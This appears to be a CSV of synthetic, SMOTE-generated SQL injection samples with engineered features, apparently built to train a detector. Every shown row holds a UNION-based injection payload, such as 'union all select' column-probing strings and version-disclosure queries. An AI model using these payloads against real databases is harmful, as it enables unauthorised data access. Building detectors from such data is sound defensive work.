id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000160,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000177,0.09902725481029281,80.0,20.0,3.296327833940337,14.0,44.0,8.0,14.0,0.175,0.55,0.1,0.175,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000125,0.9074663482174136,77.72711773635588,27.27288226364412,4.128539403167499,27.908470945423517,25.091529054576483,15.27288226364412,9.454235472711758,0.358936783115004,0.32295844831575504,0.19653314194453933,0.1215716266247017,2.4542354727117592,0.0,1.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.272882263644121,2.727117736355879,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7271177363558792,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.727117736355879
SMOTE_000162,attack,union,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",nearest_attack_euclidean,R000235,0.5601132144100945,75.0,20.826818531347627,3.569353505205948,14.0,40.69272587460949,7.3072741253905065,13.0,0.18666666666666668,0.5425696783281265,0.09743032167187343,0.17333333333333334,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.8268185313476265,-1.3877787807814457e-17,0.0,8.173181468652373,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8268185313476265,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.010744180575269002,80.0,21.953736370994584,3.773887870800491,14.0,44.0,8.0,14.0,0.175,0.55,0.1,0.175,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",nearest_attack_euclidean,R000310,0.3803494491039068,78.33720476519616,18.505807147794236,3.324713007599597,14.0,43.32559046960768,9.01161429558847,12.0,0.17873063033449582,0.5532947190642257,0.11477696745742492,0.15319768314385354,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1686023825980787,-1.3877787807814457e-17,0.0,8.83139761740192,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000006,1.4048905834360652,75.93548842282412,26.46774421141206,3.9067880355992104,40.0,2.7661278942939713,23.0,10.169360528530149,0.5270177996771367,0.03656592857444313,0.3030352348143536,0.1333810369340665,0.7016163171180895,0.46774421141205946,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,4.0,0.23387210570602987,0.2338721057060297,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000166,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000303,0.7806571565181989,82.0,20.509218217461616,3.680342901742102,14.0,38.03687286984646,15.963127130153534,14.0,0.1707317073170732,0.4638643032908105,0.1946722820750431,0.17073170731707318,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.4907817825383836,-1.3877787807814457e-17,0.0,7.5092182174616156,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000103,0.20772760328093554,81.0,26.0,3.9136649364522276,44.0,2.0,24.0,11.0,0.5432098765432098,0.024691358024691357,0.2962962962962963,0.13580246913580246,0.0,0.0,2.804871429249947,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000168,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000302,0.16568538095249755,80.92945983648981,22.92945983648981,3.7241365391882795,47.0,9.0,14.0,10.92945983648981,0.5807585474822499,0.1112090835604308,0.17299190776067017,0.13504046119664917,0.9294598364898099,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,6.0,3.0,0.9294598364898099,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.024048444731580798,77.94693275784616,28.0,3.94503233568499,40.0,3.0,23.946932757846156,11.0,0.5131739410066856,0.03848804557550142,0.30721517964097445,0.14112283377683854,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000128,0.7997548065220035,77.50316233151447,23.751581165757234,3.966238465982854,29.471539016369768,23.28004214938747,15.50316233151447,9.248418834242765,0.38144416076062415,0.29921638703944287,0.19993185974256025,0.11940759245737272,0.0,1.0,2.7515811657572353,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.4968376684855293,3.7515811657572353,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000286,0.6092995821914869,80.24304876062902,27.747682920209677,4.094110241261213,29.0,26.990731680838707,15.0,9.252317079790323,0.3614991430740358,0.3360943179566828,0.18698231538312196,0.11542422358615938,1.5046341595806476,0.0,1.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.747682920209676,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000172,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000220,0.4522456031154104,76.07061067505612,21.214122135011223,3.6253717816596733,14.0,40.85648854004489,8.0,13.214122135011223,0.18416857509153572,0.5369020355835203,0.10523918576659184,0.17369020355835205,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,8.214122135011223,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000215,0.4228142632468816,80.96070505835124,15.0,3.0356745021529914,53.16856404668099,1.0,14.0,12.792141011670248,0.6566272059988715,0.012359723620786939,0.17303613069101723,0.15797693968932439,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,8.792141011670246,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000154,0.00714816565243727,81.98365840578234,21.993463362312934,3.7530965249811232,14.0,35.986926724625874,18.0,13.996731681156467,0.17076794145059349,0.4389477809330309,0.21955878186504876,0.17072549575132684,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,6.996731681156467,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000173,0.7488891168697742,76.68605004306875,25.3255799827725,3.9575058106517282,19.0,33.348840034454994,14.0,10.33721000861375,0.2479941748636156,0.43453490020098756,0.18273254989950624,0.13473837503589062,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.33721000861375,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000176,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000077,7.248090565027149,83.0,28.591077712719454,3.984699759367488,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.5910777127194538,2.0,-1.3877787807814457e-17,0.0,1.4089222872805465,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.5910777127194538,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000177,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000161,0.11309752438178496,76.0,21.06635157383338,3.449080210834573,14.0,35.73459370466648,14.26540629533352,12.0,0.18421052631578946,0.47019202242982205,0.18770271441228314,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.06635157383338,-1.3877787807814457e-17,0.0,6.93364842616662,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.0,76.0,26.0,3.8969917835435592,40.0,3.0,23.0,10.0,0.5263157894736842,0.0394736842105263,0.3026315789473684,0.13157894736842105,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000179,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000240,0.6815041387697621,78.77005156110158,25.540103122203178,4.015128867947701,40.40103122203177,13.369020339069824,16.0,9.0,0.512338387908299,0.17027298648760172,0.20312872038662358,0.11425990521747577,0.0,1.0,2.2299484388984117,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.7700515611015883,3.2299484388984117,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.03002287748587409,79.92892620091628,21.985785240183255,3.7723372199933136,14.0,43.94314096073302,8.0,13.985785240183255,0.1751658388645287,0.5497630873363876,0.10009476506544497,0.17497630873363873,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,8.985785240183255,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000181,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000126,0.10995771694704895,75.96758467334324,19.0,3.3696367575977164,14.0,44.0,4.0,13.967584673343245,0.184290142907578,0.5791975919952451,0.05265432654502225,0.1838579385521546,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.9675846733432452,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000053,0.8943154880073231,77.75426698748709,31.68856674687177,4.259358466811294,43.24573301251291,3.3771334937435444,20.44283373435886,10.688566746871771,0.5570858556141877,0.04316902583220111,0.2623443023273644,0.13740081622624675,0.0,0.0,2.0,0.0,1.0,1.6885667468717722,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,5.688566746871771,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000183,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000178,0.21622218155471665,77.20751367809348,17.0,3.1338371384902466,53.584972643813046,1.0,8.622541034280427,14.0,0.6942030502969846,0.01295289928027396,0.11150346049890601,0.1813405899238355,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.103756839046738,1.0,0.0,8.896243160953262,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000119,0.8191173447415889,80.0,22.50134017808232,3.6685455245666008,19.0,38.99731964383536,11.002680356164642,11.0,0.2375,0.48746649554794197,0.137533504452058,0.1375,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.2506700890411604,-1.3877787807814457e-17,0.0,5.749329910958839,4.0,0.0,1.0,1.0,0.0,0.0,1.0,0.2506700890411604,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,union,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",nearest_attack_euclidean,R000184,0.9941310882478713,76.57646224997103,18.576462249971026,3.4641914734624937,14.0,32.0,18.0,12.576462249971026,0.18283143002399274,0.41790041148341206,0.23506898145941924,0.16419917703317596,0.5764622499710271,0.0,3.0,0.0,0.0,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,6.0,3.0,0.5764622499710271,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000186,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000222,0.6450174873041309,77.82373269709176,21.0,3.6571307768679664,14.0,35.29493078836704,14.705069211632956,13.82373269709176,0.17989805898113806,0.45343826580042057,0.1890548019893583,0.17760887322908303,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.176267302908239,0.8237326970917607,0.0,6.82373269709176,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,union," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000045,0.28021812160250803,80.76420896780579,26.471582064388436,3.9251018720052926,43.05683587122313,2.2357910321942196,24.235791032194218,11.235791032194218,0.5330213751521017,0.02771152093705559,0.30011698431796185,0.13915011959288087,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.764208967805782,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000188,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.009221555890224433,83.0,28.976784665354213,3.9939939028044704,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0232153346457875,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000189,attack,union,"-8772%""  )   union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",nearest_attack_euclidean,R000221,0.6026525818125915,81.33875671885667,22.16937835942834,3.644706909440606,14.0,42.6449731245733,9.693783594283381,15.0,0.17213407793187663,0.5246671913521854,0.11876936150321295,0.18442936921272496,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.3387567188566767,1.0,0.0,8.661243281143324,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000190,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000069,0.08489241694887568,76.91189437133855,26.088105628661456,3.92066384958056,40.0,3.0,23.0,10.911894371338542,0.520082745240338,0.039006205893025336,0.2990475785131944,0.1418634703534422,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.088105628661457,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000191,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.1408486135665057,83.0,27.765477646308135,3.925525360718698,40.0,4.0,26.0,13.0,0.4819277108433735,0.048192771084337366,0.3132530120481928,0.1566265060240964,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.765477646308135,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
